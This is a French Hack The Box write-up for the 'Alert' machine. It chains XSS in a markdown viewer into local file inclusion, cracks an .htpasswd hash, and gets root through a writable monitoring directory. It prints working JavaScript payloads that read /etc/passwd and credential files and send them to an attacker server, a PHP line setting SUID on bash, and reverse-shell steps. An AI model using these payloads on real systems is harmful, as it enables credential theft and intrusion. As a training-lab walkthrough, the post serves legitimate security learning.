<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: Alert</title>
<meta name=description content="Platforme: Hack The Box Lien: Alert Niveau: Facile OS: Linux Notre exploitation débute par la découverte de deux vulnérabilités XSS, l&amp;rsquo;une d&amp;rsquo;entre …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/fr/posts/htb-alert/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: Alert"><meta property="og:description" content="Platforme: Hack The Box Lien: Alert Niveau: Facile OS: Linux Notre exploitation débute par la découverte de deux vulnérabilités XSS, l&amp;rsquo;une d&amp;rsquo;entre …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-Alert/Alert.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-Alert/Alert.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: Alert"><meta name=twitter:description content="Platforme: Hack The Box Lien: Alert Niveau: Facile OS: Linux Notre exploitation débute par la découverte de deux vulnérabilités XSS, l&amp;rsquo;une d&amp;rsquo;entre …"><meta property="twitter:domain" content="https://scorpiosec.com/fr/posts/htb-alert/"><meta property="twitter:url" content="https://scorpiosec.com/fr/posts/htb-alert/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-Alert/Alert.png"><link rel=canonical href=https://scorpiosec.com/fr/posts/htb-alert/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/fr/posts/ aria-label=posts><span data-feather=book></span> Postes</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/projects/ aria-label=projects><span data-feather=code></span> Projets</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/tags/ aria-label=tags><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/categories/ aria-label=categories><span data-feather=folder></span> Catégories</a></div><div class=nav-link><a href=https://scorpiosec.com/ aria-label></a></div><div class="nav-link language-switcher"><a href=/posts/htb-alert/>English</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/fr/posts/><span data-feather=book></span> Postes</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/projects/><span data-feather=code></span> Projets</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/categories/><span data-feather=folder></span> Catégories</a></li><li class=nav-item><a href=https://scorpiosec.com/></a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: Alert</h1><small role=doc-subtitle></small><p class=post-date>6 min read |
<span class=post-date>21 Mars 2025</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/fr/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platforme: Hack The Box</li><li>Lien: <a href=https://app.hackthebox.com/machines/Alert>Alert</a></li><li>Niveau: Facile</li><li>OS: Linux</li></ul><hr><p>Notre exploitation débute par la découverte de deux vulnérabilités XSS, l&rsquo;une d&rsquo;entre elles révélant une faille d&rsquo;inclusion de fichier local (LFI). Grâce à cette faille, nous extrayons le contenu du fichier <code>.htpasswd</code>, révélant le mot de passe haché d&rsquo;un l&rsquo;utilisateur. Après avoir craqué le hachage, nous obtenons des identifiants valides et un accès initial à la cible. L&rsquo;énumération du système révèle un site web hébergé en interne. Nous découvrons ensuite que l&rsquo;utilisateur a les droits d&rsquo;écriture sur un répertoire critique, ce qui nous permet d&rsquo;accéder au compte root.</p><p>Adresse IP cible - <code>10.10.11.44</code></p><h2 id=balayage>Balayage</h2><pre tabindex=0><code>nmap -sC -sV -Pn -p- -oA nmap/Alert {TARGET_IP}
</code></pre><p><strong>Résultats</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2025-03-04 11:38 CST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.11.44
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.054s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>65532</span> closed tcp ports <span style=color:#56b6c2>(</span>conn-refused<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT      STATE    SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span style=color:#56b6c2>(</span>Ubuntu Linux; protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>3072</span> 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 <span style=color:#56b6c2>(</span>RSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> cb:92:ad:6b:fc:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>80/tcp    open     http    Apache httpd 2.4.41 <span style=color:#56b6c2>((</span>Ubuntu<span style=color:#56b6c2>))</span>
</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to http://alert.htb/
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.41 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>12227/tcp filtered unknown
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 48.16 seconds
</span></span></code></pre></div><p>Nmap trouve deux ports ouverts:</p><ul><li>22 avec SSH</li><li>80 avec http et une redirection vers <code>alert.htb</code></li></ul><pre tabindex=0><code>sudo echo &#34;{TARGET_IP} alert.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id=enumération>Enumération</h2><p>À <code>http://alert.htb/</code>, nous trouvons un visionneur de markdown.</p><p><img src=/images/HTB-Alert/alert_website.png alt="Alert maekdown viewer"></p><p>Nous téléversons un fichier et le visualisons. Il y a aussi un bouton <code>Share Markdown</code>.</p><p><img src=/images/HTB-Alert/view_md.png alt="Share Markdown button"></p><p>Nous avons également d&rsquo;autres pages: <code>Contactez-nous</code>, <code>A propos de nous</code>, et <code>Donation</code>.</p><p>Le bouton <code>View Markdown</code> envoie une requête POST à <code>/visualizer.php</code>.</p><p><img src=/images/HTB-Alert/visualizer.png alt="visualizer.php request"></p><p>L&rsquo;option <code>Share Markdown</code> envoie une requête GET à <code>/visualizer.php?link_share=xxxx.xxxx.md</code>.</p><p><img src=/images/HTB-Alert/visualizer_share.png alt="Share Markdown request"></p><p>Le bouton de la page de contact envoie une requête POST à <code>contact.php</code> et utilise deux paramètres <code>email</code> et <code>message</code>.</p><p><img src=/images/HTB-Alert/alert_contact.png alt="Contact page request"></p><p>Enfin, la page Donate envoie une requête POST à <code>/index.php?page=donate</code>.</p><p><img src=/images/HTB-Alert/alert_donate.png alt="Donate page request"></p><p>Nous utilisons gobuster pour trouver d&rsquo;éventuels répertoires cachés et obtenons quelques résultats</p><pre tabindex=0><code>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://alert.htb/
</code></pre><p><img src=/images/HTB-Alert/alert_gobuster.png alt="Directory brute forcing"></p><p>Tous les répertoires trouvés sont inaccessibles.</p><ul><li><code>http://alert.htb/uploads/</code></li></ul><p><img src=/images/HTB-Alert/uploads_dir.png alt="uploads directory"></p><ul><li><code>http://alert.htb/messages/</code></li></ul><p><img src=/images/HTB-Alert/msg_dir.png alt="messages directory"></p><ul><li><code>http://alert.htb/server-status/</code></li></ul><p><img src=/images/HTB-Alert/server_status.png alt="server_status directory"></p><p>En utilisant ffuf, nous découvrons un sous-domaine: <code>statistics</code>.</p><pre tabindex=0><code>ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://alert.htb -H &#34;Host: FUZZ.alert.htb&#34; -ic -fc 301
</code></pre><p><img src=/images/HTB-Alert/alert_ffuf.png alt="Subdomain enumeration"></p><p>À <code>http://statistics.alert.htb/</code>, nous trouvons une page de connexion qui demande un <code>username</code> et un <code>password</code>.</p><p><img src=/images/HTB-Alert/statistics_subdomain.png alt="statistics subdomain login page"></p><p><code>Basic Authentication</code> est utilisé pour l&rsquo;authentification de l&rsquo;utilisateur. Cette méthode d&rsquo;authentification simple n&rsquo;est pas sécurisée en soi vu que les informations d&rsquo;identification sont seulement encodées en Base64, et non chiffrées.</p><p><img src=/images/HTB-Alert/basic_auth.png alt="Basic authentication"></p><p>Nous retournons au visionneur de markdown. Ajoutons un payload XSS à notre fichier markdown.</p><pre tabindex=0><code>&lt;script&gt;alert(1)&lt;/script&gt;
</code></pre><p><img src=/images/HTB-Alert/xss_md.png alt="XSS test"></p><p>Lorsque nous affichons le fichier markdown, notre payload XSS est exécuté!</p><p><img src=/images/HTB-Alert/alert_xss_payload.png alt="XSS payload triggered"></p><p>La même chose se produit lorsque nous partageons le fichier.</p><p><img src=/images/HTB-Alert/alert_xss_payload1.png alt="XSS payload triggered 2"></p><p>Nous pouvons également tester une vulnérabilité XSS sur la page de contact.</p><pre tabindex=0><code>&lt;img src=x error= \&#34;fetch(&#39;http://IP:PORT/?kscorpio&#39;)\&#34;
</code></pre><p><img src=/images/HTB-Alert/test_XSS.png alt="XSS test on contact page"></p><p>Notre payload fonctionne dans ce cas également.</p><p><img src=/images/HTB-Alert/XSS_test_success.png alt="XSS on contact page success"></p><h2 id=accès-initial>Accès initial</h2><p>Nous avons confirmé deux cas de XSS. Mettons à jour le contenu de notre fichier markdown et essayons de récupérer des données sensibles.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#56b6c2>&lt;</span><span style=color:#e06c75>script</span><span style=color:#56b6c2>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>fetch</span>(<span style=color:#98c379>&#34;http://alert.htb/&#34;</span>)
</span></span><span style=display:flex><span>    .<span style=color:#e06c75>then</span>(<span style=color:#e06c75>response</span> =&gt; <span style=color:#e06c75>response</span>.<span style=color:#e06c75>text</span>())
</span></span><span style=display:flex><span>    .<span style=color:#e06c75>then</span>(<span style=color:#e06c75>data</span> =&gt; {
</span></span><span style=display:flex><span>    <span style=color:#e06c75>fetch</span>(<span style=color:#98c379>&#34;http://IP:PORT/?data=&#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>encodeURIComponent</span>(<span style=color:#e06c75>data</span>));
</span></span><span style=display:flex><span>    })
</span></span><span style=display:flex><span>    .<span style=color:#c678dd>catch</span>(<span style=color:#e06c75>error</span> =&gt; <span style=color:#e06c75>console</span>.<span style=color:#e06c75>error</span>(<span style=color:#98c379>&#34;Error fetching messages:&#34;</span>, <span style=color:#e06c75>error</span>));
</span></span><span style=display:flex><span><span style=color:#56b6c2>&lt;</span>/script&gt;
</span></span></code></pre></div><p>Même si rien ne s&rsquo;affiche lorsque nous visualisons notre fichier, la vérification du code source de la page confirme qu&rsquo;il est inclus dans la page.</p><p><img src=/images/HTB-Alert/script_included.png alt="page source code"></p><p>Nous utilisons le lien obtenu avec le bouton <code>Share Markdown</code> à <code>/contact</code>.</p><p><img src=/images/HTB-Alert/XSS_contact.png alt="xss payload in contact page"></p><p>Après avoir envoyé le message, nous recevons une réponse sur notre serveur web.</p><p>Nous décodons la réponse codée en URL dans Burp. Son contenu est le fichier html de la page d&rsquo;accueil.</p><p><img src=/images/HTB-Alert/HTML_alert.png alt="home page source code"></p><p>Une fois de plus, nous modifions le contenu de notre fichier markdown. Cette fois, nous allons essayer d&rsquo;accéder à <code>/messages</code>. Nous utilisons un lien tel que <code>http://alert.htb/visualizer.php?link_share=xxxxxx.xxxxxx.md</code> sur la page de contact.</p><p>Si l&rsquo;utilisateur qui exécute notre payload a des privilèges plus élevés, nous pourrions être en mesure de voir le contenu de <code>/messages</code>.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-Javascript data-lang=Javascript><span style=display:flex><span><span style=color:#56b6c2>&lt;</span><span style=color:#e06c75>script</span><span style=color:#56b6c2>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>fetch</span>(<span style=color:#98c379>&#34;http://alert.htb/messages.php&#34;</span>)
</span></span><span style=display:flex><span>    .<span style=color:#e06c75>then</span>(<span style=color:#e06c75>response</span> =&gt; <span style=color:#e06c75>response</span>.<span style=color:#e06c75>text</span>())
</span></span><span style=display:flex><span>    .<span style=color:#e06c75>then</span>(<span style=color:#e06c75>data</span> =&gt; {
</span></span><span style=display:flex><span>    <span style=color:#e06c75>fetch</span>(<span style=color:#98c379>&#34;http://IP:PORT/?data=&#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>encodeURIComponent</span>(<span style=color:#e06c75>data</span>));
</span></span><span style=display:flex><span>    })
</span></span><span style=display:flex><span>    .<span style=color:#c678dd>catch</span>(<span style=color:#e06c75>error</span> =&gt; <span style=color:#e06c75>console</span>.<span style=color:#e06c75>error</span>(<span style=color:#98c379>&#34;Error fetching messages:&#34;</span>, <span style=color:#e06c75>error</span>));
</span></span><span style=display:flex><span><span style=color:#56b6c2>&lt;</span>/script&gt;
</span></span></code></pre></div><p>Sur le serveur web, nous recevons une réponse.</p><h3 id=inclusion-de-fichiers-locaux-lfi>Inclusion de fichiers locaux (LFI)</h3><p>En utilisant le décodeur Burp, nous remarquons que la réponse utilise un paramètre <code>file</code> à la page <code>messages.php</code>.</p><p><img src=/images/HTB-Alert/file_param.png alt="file parameter at messages.php"></p><p>Essayons d&rsquo;en tirer parti pour exploiter une vulnérabilité LFI.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#56b6c2>&lt;</span><span style=color:#e06c75>script</span><span style=color:#56b6c2>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>fetch</span>(<span style=color:#98c379>&#34;http://alert.htb/messages.php?file=../../../../../etc/passwd&#34;</span>)
</span></span><span style=display:flex><span>    .<span style=color:#e06c75>then</span>(<span style=color:#e06c75>response</span> =&gt; <span style=color:#e06c75>response</span>.<span style=color:#e06c75>text</span>())
</span></span><span style=display:flex><span>    .<span style=color:#e06c75>then</span>(<span style=color:#e06c75>data</span> =&gt; {
</span></span><span style=display:flex><span>    <span style=color:#e06c75>fetch</span>(<span style=color:#98c379>&#34;http://IP:PORT/?data=&#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>encodeURIComponent</span>(<span style=color:#e06c75>data</span>));
</span></span><span style=display:flex><span>    })
</span></span><span style=display:flex><span>    .<span style=color:#c678dd>catch</span>(<span style=color:#e06c75>error</span> =&gt; <span style=color:#e06c75>console</span>.<span style=color:#e06c75>error</span>(<span style=color:#98c379>&#34;Error fetching messages:&#34;</span>, <span style=color:#e06c75>error</span>));
</span></span><span style=display:flex><span><span style=color:#56b6c2>&lt;</span>/script&gt;
</span></span></code></pre></div><p>Après avoir décodé la réponse, nous constatons que le LFI fonctionne! Nous trouvons deux utilisateurs <code>albert</code> et <code>david</code>.</p><p><img src=/images/HTB-Alert/XSS_LFI.png alt="XSS to LFI"></p><p>Nous nous souvenons que <code>Basic Authentication</code> est utilisé à <code>http://statistics.alert.htb/</code>. Maintenant que nous avons un LFI fonctionnel, nous pouvons essayer de lire le fichier <code>.htpasswd</code>.</p><blockquote><p>Le fichier <code>.htpasswd</code> d&rsquo;Apache stocke les noms d&rsquo;utilisateurs et les mots de passe cryptés pour l&rsquo;authentification HTTP.</p></blockquote><p>Pour trouver son emplacement, nous allons lire le fichier de configuration d&rsquo;Apache. Les chemins les plus courants sont <code>/etc/apache2/apache2.conf</code> et <code>/etc/apache2/sites-available/000-default.conf</code>.</p><blockquote><p><code>apache2.conf</code> est le fichier de configuration principal tandis que <code>000-default.conf</code> est le fichier définissant la configuration des hôtes virtuels.</p></blockquote><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#56b6c2>&lt;</span><span style=color:#e06c75>script</span><span style=color:#56b6c2>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>fetch</span>(<span style=color:#98c379>&#34;http://alert.htb/messages.php?file=../../../../../etc/apache2/apache2.conf&#34;</span>)
</span></span><span style=display:flex><span>    .<span style=color:#e06c75>then</span>(<span style=color:#e06c75>response</span> =&gt; <span style=color:#e06c75>response</span>.<span style=color:#e06c75>text</span>())
</span></span><span style=display:flex><span>    .<span style=color:#e06c75>then</span>(<span style=color:#e06c75>data</span> =&gt; {
</span></span><span style=display:flex><span>    <span style=color:#e06c75>fetch</span>(<span style=color:#98c379>&#34;http://IP:PORT/?data=&#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>encodeURIComponent</span>(<span style=color:#e06c75>data</span>));
</span></span><span style=display:flex><span>    })
</span></span><span style=display:flex><span>    .<span style=color:#c678dd>catch</span>(<span style=color:#e06c75>error</span> =&gt; <span style=color:#e06c75>console</span>.<span style=color:#e06c75>error</span>(<span style=color:#98c379>&#34;Error fetching messages:&#34;</span>, <span style=color:#e06c75>error</span>));
</span></span><span style=display:flex><span><span style=color:#56b6c2>&lt;</span>/script&gt;
</span></span></code></pre></div><p>Nous lisons le contenu de <code>apache2.conf</code> mais il ne mentionne pas <code>.htpasswd</code> de manière pertinente.</p><p><img src=/images/HTB-Alert/apache2.png alt="Apache2.conf file"></p><p>En revanche, <code>000-default.conf</code> révèle l&rsquo;emplacement de <code>.htpasswd</code> qui est <code>/var/www/statistics.alert.htb/.htpasswd</code>.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#56b6c2>&lt;</span><span style=color:#e06c75>script</span><span style=color:#56b6c2>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>fetch</span>(<span style=color:#98c379>&#34;http://alert.htb/messages.php?file=../../../../../etc/apache2/sites-available/000-default.conf&#34;</span>)
</span></span><span style=display:flex><span>    .<span style=color:#e06c75>then</span>(<span style=color:#e06c75>response</span> =&gt; <span style=color:#e06c75>response</span>.<span style=color:#e06c75>text</span>())
</span></span><span style=display:flex><span>    .<span style=color:#e06c75>then</span>(<span style=color:#e06c75>data</span> =&gt; {
</span></span><span style=display:flex><span>    <span style=color:#e06c75>fetch</span>(<span style=color:#98c379>&#34;http://IP:PORT/?data=&#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>encodeURIComponent</span>(<span style=color:#e06c75>data</span>));
</span></span><span style=display:flex><span>    })
</span></span><span style=display:flex><span>    .<span style=color:#c678dd>catch</span>(<span style=color:#e06c75>error</span> =&gt; <span style=color:#e06c75>console</span>.<span style=color:#e06c75>error</span>(<span style=color:#98c379>&#34;Error fetching messages:&#34;</span>, <span style=color:#e06c75>error</span>));
</span></span><span style=display:flex><span><span style=color:#56b6c2>&lt;</span>/script&gt;
</span></span></code></pre></div><p><img src=/images/HTB-Alert/000-default.png alt="000-default.conf file"></p><p>Nous allons maintenant lire le fichier.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#56b6c2>&lt;</span><span style=color:#e06c75>script</span><span style=color:#56b6c2>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>fetch</span>(<span style=color:#98c379>&#34;http://alert.htb/messages.php?file=../../../../../var/www/statistics.alert.htb/.htpasswd&#34;</span>)
</span></span><span style=display:flex><span>    .<span style=color:#e06c75>then</span>(<span style=color:#e06c75>response</span> =&gt; <span style=color:#e06c75>response</span>.<span style=color:#e06c75>text</span>())
</span></span><span style=display:flex><span>    .<span style=color:#e06c75>then</span>(<span style=color:#e06c75>data</span> =&gt; {
</span></span><span style=display:flex><span>    <span style=color:#e06c75>fetch</span>(<span style=color:#98c379>&#34;http://10.10.15.91:8000/?data=&#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>encodeURIComponent</span>(<span style=color:#e06c75>data</span>));
</span></span><span style=display:flex><span>    })
</span></span><span style=display:flex><span>    .<span style=color:#c678dd>catch</span>(<span style=color:#e06c75>error</span> =&gt; <span style=color:#e06c75>console</span>.<span style=color:#e06c75>error</span>(<span style=color:#98c379>&#34;Error fetching messages:&#34;</span>, <span style=color:#e06c75>error</span>));
</span></span><span style=display:flex><span><span style=color:#56b6c2>&lt;</span>/script&gt;
</span></span></code></pre></div><h3 id=shell-en-tant-que-albert>Shell en tant que albert</h3><p>Après avoir décodé la réponse, nous récupérons le hachage du mot de passe de <code>albert</code>.</p><p><img src=/images/HTB-Alert/albert_pwd.png alt="albert password hash"></p><p>Il s&rsquo;agit d&rsquo;un hachage Apache, qui peut être craqué avec le mode hashcat <code>1600</code>.</p><pre tabindex=0><code>hashcat -a 0 -m 1600 hash.txt /usr/share/wordlists/rockyou.txt
</code></pre><p>Nous récupérons le mot de passe <code>manchesterunited</code>.</p><p><img src=/images/HTB-Alert/albert_pass.png alt="albert password"></p><hr><p>Les informations d&rsquo;identification <code>albert:manchesterunited</code> fonctionnent à <code>http://statistics.alert.htb/</code> mais la page n&rsquo;affiche que des données sur les donateurs.</p><p><img src=/images/HTB-Alert/donors_info.png alt="Alert Dashboard"></p><hr><p>Nous nous connectons via SSH avec ces informations d&rsquo;identification et trouvons le drapeau utilisateur.</p><p><img src=/images/HTB-Alert/user_flag.png alt="Foothold & user flag"></p><h2 id=elévation-de-privilèges>Elévation de Privilèges</h2><p>Avec la commande <code>id</code>, nous découvrons que <code>albert</code> fait partie d&rsquo;un groupe appelé <code>management</code>. En recherchant les fichiers liés à ce groupe, nous trouvons des fichiers suggérant un outil ou une application pour la surveillance des sites web.</p><p><img src=/images/HTB-Alert/management_files.png alt="Files related to management group"></p><p>Dans <code>/opt/website-monitor/</code>, nous trouvons d&rsquo;autres fichiers qui confirment notre théorie d&rsquo;une application de surveillance.</p><p><img src=/images/HTB-Alert/website_monitor_files.png alt="Website monitor files"></p><p>Avec <code>ps aux</code> nous remarquons que l&rsquo;utilisateur <code>root</code> exécute l&rsquo;application web sur le port <code>8080</code>.</p><p><img src=/images/HTB-Alert/root_ps_8080.png alt="Internal website on port 8080"></p><h3 id=exploitation-locale>Exploitation locale</h3><p>Parce que <code>albert</code> fait partie du groupe <code>management</code>, il a les permissions d&rsquo;écriture sur <code>/opt/website-monitor/config/</code>. Nous pouvons en abuser pour obtenir un shell en tant que root en mettant le bit SUID sur <code>/bin/bash</code>.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-PHP data-lang=PHP><span style=display:flex><span><span style=color:#56b6c2>&lt;?</span><span style=color:#e06c75>php</span> <span style=color:#e06c75>exec</span>(<span style=color:#98c379>&#34;chmod +s /bin/bash&#34;</span>); <span style=color:#7f848e>?&gt;</span>
</span></span></code></pre></div><pre tabindex=0><code>curl 127.0.0.1:8080/config/revshell.php

bash -p
</code></pre><p><img src=/images/HTB-Alert/SUID_root.png alt="SUID bit set to bash binary"></p><h3 id=reverse-shell-via-le-navigateur>Reverse Shell via le navigateur</h3><p>Nous pouvons également exécuter un fichier reverse shell PHP. Cependant, nous devons d&rsquo;abord mettre en place un tunnel.</p><pre tabindex=0><code>ssh -L {PORT}:localhost:8080 albert@IP
</code></pre><p>Nous accédons en effet à une application de surveillance à <code>http://localhost:{PORT}/</code>.</p><p><img src=/images/HTB-Alert/website_monitor_website.png alt="Access to internal website"></p><p>Nous naviguons vers <code>http://localhost:{PORT}/config/revshell.php</code> pour exécuter notre fichier malveillant.</p><blockquote><p>J&rsquo;ai utilisé le shell <code>PHP Ivan Sineck</code> disponible sur <a href=https://www.revshells.com/>revshells.com</a>.</p></blockquote><p><img src=/images/HTB-Alert/php_revshell_file.png alt="php reverse shell"></p><p>Nous recevons un shell root sur notre listner netcat.</p><p><img src=/images/HTB-Alert/revshell_root.png alt="root flag"></p></div><div class=prev-next><div class=prev-post><p><a href=/fr/posts/htb-chemistry/>&#8592;
Précédent:
HTB: Chemistry</a></p><p class=prev-post-date>mars 7, 2025</p></div><div class=next-post><p><a href=/fr/posts/htb-linkvortex/>Suivant:
HTB: LinkVortex
&#8594;</a></p><p class=next-post-date>avril 11, 2025</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#balayage>Balayage</a></li><li><a href=#enumération>Enumération</a></li><li><a href=#accès-initial>Accès initial</a><ul><li><a href=#inclusion-de-fichiers-locaux-lfi>Inclusion de fichiers locaux (LFI)</a></li><li><a href=#shell-en-tant-que-albert>Shell en tant que albert</a></li></ul></li><li><a href=#elévation-de-privilèges>Elévation de Privilèges</a><ul><li><a href=#exploitation-locale>Exploitation locale</a></li><li><a href=#reverse-shell-via-le-navigateur>Reverse Shell via le navigateur</a></li></ul></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2025 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>